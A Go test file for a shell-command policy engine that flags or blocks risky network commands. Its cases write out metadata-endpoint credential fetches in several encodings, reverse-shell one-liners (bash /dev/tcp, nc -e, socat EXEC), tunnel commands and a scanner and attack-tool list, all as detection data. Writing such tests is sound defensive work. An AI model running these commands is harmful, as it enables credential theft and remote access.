package policy

import (
	"testing"
	"time"
)

// netEvent builds a shell_exec event in the standard test project under the
// POSIX dialect (the network-command spellings the rules target).
func netEvent(cmd string) Event {
	return Event{
		Kind:        KindShellExec,
		ActionType:  "run_command",
		Target:      cmd,
		Cwd:         "/home/u/proj",
		ProjectRoot: "/home/u/proj",
		SessionID:   "s1",
		Now:         time.Date(2026, 6, 10, 12, 0, 0, 0, time.UTC),
	}
}

// netEngine builds an engine with the given mode, network host lists and
// overrides.
func netEngine(t *testing.T, mode Mode, allow, deny []string, ov ...Override) *Engine {
	t.Helper()
	eng, err := New(Config{
		Mode: mode, Home: "/home/u",
		NetworkAllowHosts: allow,
		NetworkDenyHosts:  deny,
		Overrides:         ov,
	})
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	return eng
}

// netAsk is the decision a test override raises a silent rule to.
var netAsk = DecisionAsk

// TestNetworkMetadata_R174 covers R-174 (a): a metadata endpoint in any
// encoding, flag in observe and deny in enforce, with near misses.
func TestNetworkMetadata_R174(t *testing.T) {
	t.Parallel()
	obs := netEngine(t, ModeObserve, nil, nil)
	enf := netEngine(t, ModeEnforce, nil, nil)
	hits := []struct{ name, cmd string }{
		{"aws/gcp/azure v4", "curl http://169.254.169.254/latest/meta-data/"},
		{"ecs credential relay", "curl http://169.254.170.2/v2/credentials"},
		{"alibaba cgnat metadata", "curl http://100.100.100.200/latest/meta-data/"},
		{"ipv6 metadata bracketed", "curl http://[fd00:ec2::254]/latest/"},
		{"decimal encoding", "curl http://2852039166/"},
		{"hex encoding", "curl http://0xa9fea9fe/"},
		{"octal-part encoding", "wget http://0251.0376.0251.0376/"},
		{"gce metadata hostname", "curl http://metadata.google.internal/computeMetadata/v1/"},
		{"bare metadata hostname", "curl -s -H 'Metadata-Flavor: Google' http://metadata/"},
		{"nat64-wrapped metadata", "curl http://[64:ff9b::a9fe:a9fe]/"},
		{"wget to metadata", "wget -qO- http://169.254.169.254/latest/meta-data/iam/"},
	}
	for _, tc := range hits {
		t.Run("hit/"+tc.name, func(t *testing.T) {
			t.Parallel()
			if v := obs.Evaluate(netEvent(tc.cmd)); v.RuleID != "R-174" || v.Decision != DecisionFlag {
				t.Errorf("observe %q = %s/%s, want R-174/flag", tc.cmd, v.Decision, v.RuleID)
			}
			if v := enf.Evaluate(netEvent(tc.cmd)); v.RuleID != "R-174" || v.Decision != DecisionDeny {
				t.Errorf("enforce %q = %s/%s, want R-174/deny", tc.cmd, v.Decision, v.RuleID)
			}
		})
	}
	misses := []struct{ name, cmd string }{
		{"public host", "curl https://example.com/api"},
		{"loopback", "curl http://localhost:3000/health"},
		{"loopback literal", "curl http://127.0.0.1:8080/"},
		{"public ip is not metadata", "curl http://203.0.113.5/"},
		{"non-network command", "echo 169.254.169.254"},
	}
	for _, tc := range misses {
		t.Run("miss/"+tc.name, func(t *testing.T) {
			t.Parallel()
			if v := enf.Evaluate(netEvent(tc.cmd)); v.RuleID == "R-174" {
				t.Errorf("enforce %q wrongly hit R-174 (%s)", tc.cmd, v.Reason)
			}
		})
	}
}

// TestNetworkDenyHost_R174 covers R-174 (b): a host on [guard.network]
// deny_hosts, inert while the list is empty.
func TestNetworkDenyHost_R174(t *testing.T) {
	t.Parallel()
	deny := []string{"evil.example.com", "203.0.113.0/24", "198.51.100.7"}

	t.Run("inert while empty", func(t *testing.T) {
		t.Parallel()
		enf := netEngine(t, ModeEnforce, nil, nil)
		if v := enf.Evaluate(netEvent("curl https://evil.example.com/x")); v.RuleID == "R-174" {
			t.Errorf("empty deny list still hit R-174 (%s)", v.Reason)
		}
	})

	enf := netEngine(t, ModeEnforce, nil, deny)
	obs := netEngine(t, ModeObserve, nil, deny)
	hits := []struct{ name, cmd string }{
		{"exact host", "curl https://evil.example.com/x"},
		{"subdomain of denied host", "wget https://api.evil.example.com/y"},
		{"ip in denied cidr", "curl http://203.0.113.9/"},
		{"exact denied ip", "curl http://198.51.100.7/"},
	}
	for _, tc := range hits {
		t.Run("hit/"+tc.name, func(t *testing.T) {
			t.Parallel()
			if v := obs.Evaluate(netEvent(tc.cmd)); v.RuleID != "R-174" || v.Decision != DecisionFlag {
				t.Errorf("observe %q = %s/%s, want R-174/flag", tc.cmd, v.Decision, v.RuleID)
			}
			if v := enf.Evaluate(netEvent(tc.cmd)); v.RuleID != "R-174" || v.Decision != DecisionDeny {
				t.Errorf("enforce %q = %s/%s, want R-174/deny", tc.cmd, v.Decision, v.RuleID)
			}
		})
	}
	t.Run("miss/host not on deny list", func(t *testing.T) {
		t.Parallel()
		if v := enf.Evaluate(netEvent("curl https://good.example.com/x")); v.RuleID == "R-174" {
			t.Errorf("non-denied host hit R-174 (%s)", v.Reason)
		}
	})
}

// TestNetworkPrivateRange_R175 covers R-175 (a): private / link-local / CGNAT
// / ULA addresses. The row is allow/allow, so it is silent by default and
// fires once raised by an override.
func TestNetworkPrivateRange_R175(t *testing.T) {
	t.Parallel()
	raise := Override{RuleID: "R-175", Decision: &netAsk, Source: "user"}
	hits := []struct{ name, cmd string }{
		{"rfc1918 10/8", "curl http://10.0.0.5/admin"},
		{"rfc1918 192.168", "curl http://192.168.1.1/"},
		{"link-local non-metadata", "curl http://169.254.0.1/"},
		{"cgnat", "curl http://100.64.0.1/"},
		{"ula", "curl http://[fd12::1]/"},
	}
	silent := netEngine(t, ModeEnforce, nil, nil)
	raised := netEngine(t, ModeEnforce, nil, nil, raise)
	for _, tc := range hits {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			if v := silent.Evaluate(netEvent(tc.cmd)); v.Decision != DecisionAllow || v.RuleID != "" {
				t.Errorf("default (silent) %q = %s/%s, want allow/\"\"", tc.cmd, v.Decision, v.RuleID)
			}
			if v := raised.Evaluate(netEvent(tc.cmd)); v.RuleID != "R-175" || v.Decision != DecisionAsk {
				t.Errorf("raised %q = %s/%s, want R-175/ask", tc.cmd, v.Decision, v.RuleID)
			}
		})
	}
	misses := []struct{ name, cmd string }{
		{"loopback excluded", "curl http://127.0.0.1:3000/"},
		{"metadata is R-174 not R-175", "curl http://169.254.169.254/"},
		{"public host name", "curl https://example.com"},
	}
	for _, tc := range misses {
		t.Run("miss/"+tc.name, func(t *testing.T) {
			t.Parallel()
			if v := raised.Evaluate(netEvent(tc.cmd)); v.RuleID == "R-175" {
				t.Errorf("raised %q wrongly hit R-175 (%s)", tc.cmd, v.Reason)
			}
		})
	}
}

// TestNetworkRawPublicIP_R175 covers R-175 (b): a raw public IP instead of a
// host name. Allow/allow: silent until raised.
func TestNetworkRawPublicIP_R175(t *testing.T) {
	t.Parallel()
	raise := Override{RuleID: "R-175", Decision: &netAsk, Source: "user"}
	silent := netEngine(t, ModeEnforce, nil, nil)
	raised := netEngine(t, ModeEnforce, nil, nil, raise)
	hits := []struct{ name, cmd string }{
		{"documentation public ip", "curl https://203.0.113.5/api"},
		{"other doc range", "wget http://198.51.100.9/pkg.tar"},
		{"decimal public form", "curl http://3405803781/"}, // 203.0.113.5
	}
	for _, tc := range hits {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			if v := silent.Evaluate(netEvent(tc.cmd)); v.Decision != DecisionAllow || v.RuleID != "" {
				t.Errorf("default (silent) %q = %s/%s, want allow/\"\"", tc.cmd, v.Decision, v.RuleID)
			}
			if v := raised.Evaluate(netEvent(tc.cmd)); v.RuleID != "R-175" || v.Decision != DecisionAsk {
				t.Errorf("raised %q = %s/%s, want R-175/ask", tc.cmd, v.Decision, v.RuleID)
			}
		})
	}
	misses := []struct{ name, cmd string }{
		{"host name is not a raw ip", "curl https://example.com"},
		{"private ip is the other row", "curl http://10.0.0.5/"},
		{"loopback literal", "curl http://127.0.0.1/"},
	}
	for _, tc := range misses {
		t.Run("miss/"+tc.name, func(t *testing.T) {
			t.Parallel()
			v := raised.Evaluate(netEvent(tc.cmd))
			// A private-range hit is a different R-175 row; the raw-public row
			// must not be the reason. Assert via the reason text.
			if v.RuleID == "R-175" && containsSub(v.Reason, "raw public IP") {
				t.Errorf("raised %q wrongly hit the raw-public row (%s)", tc.cmd, v.Reason)
			}
		})
	}
}

// TestNetworkAllowList_R176 covers R-176: a host not on [guard.network]
// allow_hosts. Allow/allow: silent until raised; loopback always passes; an
// empty list once raised means every non-loopback host.
func TestNetworkAllowList_R176(t *testing.T) {
	t.Parallel()
	raise := Override{RuleID: "R-176", Decision: &netAsk, Source: "user"}

	t.Run("silent by default even with a list", func(t *testing.T) {
		t.Parallel()
		eng := netEngine(t, ModeEnforce, []string{"example.com"}, nil)
		if v := eng.Evaluate(netEvent("curl https://other.com")); v.Decision != DecisionAllow || v.RuleID != "" {
			t.Errorf("default = %s/%s, want allow/\"\"", v.Decision, v.RuleID)
		}
	})

	t.Run("raised, empty list means every non-loopback host", func(t *testing.T) {
		t.Parallel()
		eng := netEngine(t, ModeEnforce, nil, nil, raise)
		if v := eng.Evaluate(netEvent("curl https://example.com")); v.RuleID != "R-176" || v.Decision != DecisionAsk {
			t.Errorf("non-loopback = %s/%s, want R-176/ask", v.Decision, v.RuleID)
		}
		if v := eng.Evaluate(netEvent("curl http://localhost:3000")); v.RuleID == "R-176" {
			t.Errorf("loopback hit R-176 (%s)", v.Reason)
		}
		if v := eng.Evaluate(netEvent("curl http://127.0.0.1:8080/")); v.RuleID == "R-176" {
			t.Errorf("loopback literal hit R-176 (%s)", v.Reason)
		}
	})

	t.Run("raised, plain domain matches host and subdomains", func(t *testing.T) {
		t.Parallel()
		eng := netEngine(t, ModeEnforce, []string{"example.com"}, nil, raise)
		for _, ok := range []string{"curl https://example.com/x", "curl https://api.example.com/y"} {
			if v := eng.Evaluate(netEvent(ok)); v.RuleID == "R-176" {
				t.Errorf("allow-listed %q hit R-176 (%s)", ok, v.Reason)
			}
		}
		if v := eng.Evaluate(netEvent("curl https://evil.com")); v.RuleID != "R-176" {
			t.Errorf("non-listed host did not hit R-176: %s/%s", v.Decision, v.RuleID)
		}
	})

	t.Run("raised, wildcard matches only subdomains", func(t *testing.T) {
		t.Parallel()
		eng := netEngine(t, ModeEnforce, []string{"*.example.com"}, nil, raise)
		if v := eng.Evaluate(netEvent("curl https://api.example.com")); v.RuleID == "R-176" {
			t.Errorf("subdomain hit R-176 under *.example.com (%s)", v.Reason)
		}
		if v := eng.Evaluate(netEvent("curl https://example.com")); v.RuleID != "R-176" {
			t.Errorf("apex should not match *.example.com: %s/%s", v.Decision, v.RuleID)
		}
	})

	t.Run("raised, cidr and ip allow entries", func(t *testing.T) {
		t.Parallel()
		eng := netEngine(t, ModeEnforce, []string{"10.0.0.0/8", "203.0.113.5"}, nil, raise)
		for _, ok := range []string{"curl http://10.1.2.3/", "curl http://203.0.113.5/"} {
			if v := eng.Evaluate(netEvent(ok)); v.RuleID == "R-176" {
				t.Errorf("allow-listed %q hit R-176 (%s)", ok, v.Reason)
			}
		}
		if v := eng.Evaluate(netEvent("curl http://198.51.100.9/")); v.RuleID != "R-176" {
			t.Errorf("ip outside the allow entries did not hit R-176: %s/%s", v.Decision, v.RuleID)
		}
	})
}

// TestNetworkReverseShell_R177 covers R-177 (a): reverse-shell shapes,
// flag in observe and deny in enforce.
func TestNetworkReverseShell_R177(t *testing.T) {
	t.Parallel()
	obs := netEngine(t, ModeObserve, nil, nil)
	enf := netEngine(t, ModeEnforce, nil, nil)
	hits := []struct{ name, cmd string }{
		{"bash /dev/tcp redirect", `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`},
		{"bash /dev/udp redirect", `bash -c "cat </dev/udp/10.0.0.1/53"`},
		{"nc -e", "nc -e /bin/sh 10.0.0.1 4444"},
		{"ncat --exec", "ncat --exec /bin/bash 10.0.0.1 4444"},
		{"netcat -c", "netcat -c /bin/sh 203.0.113.5 9000"},
		{"socat exec over tcp", "socat TCP4:10.0.0.1:4444 EXEC:/bin/bash"},
		{"mkfifo + nc pipeline", "mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f | /bin/sh > /tmp/f"},
	}
	for _, tc := range hits {
		t.Run("hit/"+tc.name, func(t *testing.T) {
			t.Parallel()
			if v := obs.Evaluate(netEvent(tc.cmd)); v.RuleID != "R-177" || v.Decision != DecisionFlag {
				t.Errorf("observe %q = %s/%s, want R-177/flag", tc.cmd, v.Decision, v.RuleID)
			}
			if v := enf.Evaluate(netEvent(tc.cmd)); v.RuleID != "R-177" || v.Decision != DecisionDeny {
				t.Errorf("enforce %q = %s/%s, want R-177/deny", tc.cmd, v.Decision, v.RuleID)
			}
		})
	}
	t.Run("miss/plain nc connect is not a reverse shell", func(t *testing.T) {
		t.Parallel()
		if v := enf.Evaluate(netEvent("nc example.com 443")); v.RuleID == "R-177" {
			t.Errorf("plain nc connect hit R-177 (%s)", v.Reason)
		}
	})
}

// TestNetworkListener_R177 covers R-177 (b): opening a listener, flag in
// observe and ask in enforce.
func TestNetworkListener_R177(t *testing.T) {
	t.Parallel()
	obs := netEngine(t, ModeObserve, nil, nil)
	enf := netEngine(t, ModeEnforce, nil, nil)
	hits := []struct{ name, cmd string }{
		{"nc -l -p", "nc -l -p 4444"},
		{"nc clustered -lvp", "nc -lvp 8080"},
		{"ncat --listen", "ncat --listen 9000"},
		{"socat tcp-listen", "socat TCP-LISTEN:8080,reuseaddr -"},
	}
	for _, tc := range hits {
		t.Run("hit/"+tc.name, func(t *testing.T) {
			t.Parallel()
			if v := obs.Evaluate(netEvent(tc.cmd)); v.RuleID != "R-177" || v.Decision != DecisionFlag {
				t.Errorf("observe %q = %s/%s, want R-177/flag", tc.cmd, v.Decision, v.RuleID)
			}
			if v := enf.Evaluate(netEvent(tc.cmd)); v.RuleID != "R-177" || v.Decision != DecisionAsk {
				t.Errorf("enforce %q = %s/%s, want R-177/ask", tc.cmd, v.Decision, v.RuleID)
			}
		})
	}
	t.Run("miss/nc connect is not a listener", func(t *testing.T) {
		t.Parallel()
		v := enf.Evaluate(netEvent("nc example.com 80"))
		if v.RuleID == "R-177" {
			t.Errorf("nc connect hit R-177 (%s)", v.Reason)
		}
	})
}

// TestNetworkTunnel_R178 covers R-178: tunnels exposing this machine, flag in
// observe and ask in enforce, with the non-exposing subcommands excluded.
func TestNetworkTunnel_R178(t *testing.T) {
	t.Parallel()
	obs := netEngine(t, ModeObserve, nil, nil)
	enf := netEngine(t, ModeEnforce, nil, nil)
	hits := []struct{ name, cmd string }{
		{"ngrok http", "ngrok http 8080"},
		{"ngrok tcp", "ngrok tcp 22"},
		{"cloudflared tunnel run", "cloudflared tunnel run mytunnel"},
		{"cloudflared tunnel --url", "cloudflared tunnel --url http://localhost:8080"},
		{"ssh -R remote forward", "ssh -R 9000:localhost:22 user@host"},
		{"localtunnel", "lt --port 8080"},
		{"bore local", "bore local 8080 --to bore.pub"},
		{"tailscale funnel", "tailscale funnel 8080"},
		{"zrok share", "zrok share public localhost:8080"},
		{"frpc", "frpc -c frpc.ini"},
		{"devtunnel host", "devtunnel host -p 8080"},
		{"code tunnel", "code tunnel"},
	}
	for _, tc := range hits {
		t.Run("hit/"+tc.name, func(t *testing.T) {
			t.Parallel()
			if v := obs.Evaluate(netEvent(tc.cmd)); v.RuleID != "R-178" || v.Decision != DecisionFlag {
				t.Errorf("observe %q = %s/%s, want R-178/flag", tc.cmd, v.Decision, v.RuleID)
			}
			if v := enf.Evaluate(netEvent(tc.cmd)); v.RuleID != "R-178" || v.Decision != DecisionAsk {
				t.Errorf("enforce %q = %s/%s, want R-178/ask", tc.cmd, v.Decision, v.RuleID)
			}
		})
	}
	misses := []struct{ name, cmd string }{
		{"cloudflared tunnel list", "cloudflared tunnel list"},
		{"cloudflared tunnel info", "cloudflared tunnel info mytunnel"},
		{"code tunnel status", "code tunnel status"},
		{"ssh -L local forward is not exposure", "ssh -L 8080:localhost:80 user@host"},
		{"plain ssh", "ssh user@host"},
	}
	for _, tc := range misses {
		t.Run("miss/"+tc.name, func(t *testing.T) {
			t.Parallel()
			if v := enf.Evaluate(netEvent(tc.cmd)); v.RuleID == "R-178" {
				t.Errorf("%q wrongly hit R-178 (%s)", tc.cmd, v.Reason)
			}
		})
	}
}

// TestNetworkScanner_R179 covers R-179: network/vulnerability scanners, flag
// in observe and ask in enforce.
func TestNetworkScanner_R179(t *testing.T) {
	t.Parallel()
	obs := netEngine(t, ModeObserve, nil, nil)
	enf := netEngine(t, ModeEnforce, nil, nil)
	for _, base := range []string{"nmap", "masscan", "zmap", "rustscan", "naabu", "unicornscan", "hping3", "nikto", "nuclei", "sqlmap", "ffuf", "gobuster", "feroxbuster", "hydra", "wfuzz", "zaproxy", "zap.sh", "zap-baseline.py"} {
		cmd := base + " 203.0.113.5"
		t.Run("hit/"+base, func(t *testing.T) {
			t.Parallel()
			if v := obs.Evaluate(netEvent(cmd)); v.RuleID != "R-179" || v.Decision != DecisionFlag {
				t.Errorf("observe %q = %s/%s, want R-179/flag", cmd, v.Decision, v.RuleID)
			}
			if v := enf.Evaluate(netEvent(cmd)); v.RuleID != "R-179" || v.Decision != DecisionAsk {
				t.Errorf("enforce %q = %s/%s, want R-179/ask", cmd, v.Decision, v.RuleID)
			}
		})
	}
	// One near-miss per base added by D33: the scanner name appears only as a
	// file or path operand of an ordinary command, never as the command word.
	for _, tc := range []struct{ base, cmd string }{
		{"ffuf", "cat ffuf"},
		{"gobuster", "ls gobuster"},
		{"feroxbuster", "cat feroxbuster.toml"},
		{"hydra", "cat hydra.txt"},
		{"wfuzz", "grep wfuzz notes.md"},
		{"zaproxy", "echo zaproxy"},
		{"zap.sh", "cat zap.sh"},
		{"zap-baseline.py", "cat zap-baseline.py"},
	} {
		t.Run("miss/operand only/"+tc.base, func(t *testing.T) {
			t.Parallel()
			if v := enf.Evaluate(netEvent(tc.cmd)); v.RuleID == "R-179" {
				t.Errorf("%q hit R-179 (%s)", tc.cmd, v.Reason)
			}
		})
	}
	t.Run("miss/ordinary tool is not a scanner", func(t *testing.T) {
		t.Parallel()
		if v := enf.Evaluate(netEvent("ping -c 1 example.com")); v.RuleID == "R-179" {
			t.Errorf("ping hit R-179 (%s)", v.Reason)
		}
	})
}

// TestNetworkHostsPerBase pins that a host is extracted (metadata detected)
// across the full command-base table, one case per base.
func TestNetworkHostsPerBase(t *testing.T) {
	t.Parallel()
	enf := netEngine(t, ModeEnforce, nil, nil)
	cases := []struct{ name, cmd string }{
		{"curl url", "curl http://169.254.169.254/"},
		{"wget url", "wget http://169.254.169.254/"},
		{"httpie bare host", "http 169.254.169.254/latest"},
		{"httpie method then host", "http GET 169.254.169.254/latest"},
		{"xh bare host", "xh 169.254.169.254/latest"},
		{"nc host port", "nc 169.254.169.254 80"},
		{"telnet host port", "telnet 169.254.169.254 80"},
		{"ping host", "ping -c 1 169.254.169.254"},
		{"traceroute host", "traceroute 169.254.169.254"},
		{"ssh destination", "ssh user@169.254.169.254 uptime"},
		{"scp remote spec", "scp ./f root@169.254.169.254:/tmp/f"},
		{"rsync remote spec", "rsync -av ./d/ root@169.254.169.254:/d/"},
		{"socat tcp address", "socat - TCP:169.254.169.254:80"},
		{"openssl s_client", "openssl s_client -connect 169.254.169.254:443"},
		{"git clone url", "git clone http://169.254.169.254/repo.git"},
		{"invoke-webrequest uri", "Invoke-WebRequest -Uri http://169.254.169.254/latest"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			ev := netEvent(tc.cmd)
			// Invoke-WebRequest is a PowerShell cmdlet; read it under that dialect.
			if tc.name == "invoke-webrequest uri" {
				ev.Dialect = DialectPowerShell
			}
			if v := enf.Evaluate(ev); v.RuleID != "R-174" {
				t.Errorf("%q = %s/%s, want R-174 (metadata host extracted)", tc.cmd, v.Decision, v.RuleID)
			}
		})
	}
}

// TestNetworkNoFalseHostFromPort pins that a numeric flag value (a port, a
// count, a timeout) is not mistaken for a host, which would wrongly fire the
// raised allow-list row.
func TestNetworkNoFalseHostFromPort(t *testing.T) {
	t.Parallel()
	raise := Override{RuleID: "R-176", Decision: &netAsk, Source: "user"}
	eng := netEngine(t, ModeEnforce, []string{"example.com"}, nil, raise)
	cases := []string{
		"curl --max-time 30 https://example.com",
		"ping -c 4 example.com",
		"nc -w 3 example.com 8080",
	}
	for _, cmd := range cases {
		t.Run(cmd, func(t *testing.T) {
			t.Parallel()
			if v := eng.Evaluate(netEvent(cmd)); v.RuleID == "R-176" {
				t.Errorf("%q wrongly hit R-176 — a numeric value was read as a host (%s)", cmd, v.Reason)
			}
		})
	}
}

// containsSub is a tiny substring helper (kept local to avoid importing
// strings into a test file that otherwise needs none).
func containsSub(s, sub string) bool {
	return len(sub) == 0 || (len(s) >= len(sub) && indexOf(s, sub) >= 0)
}

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}
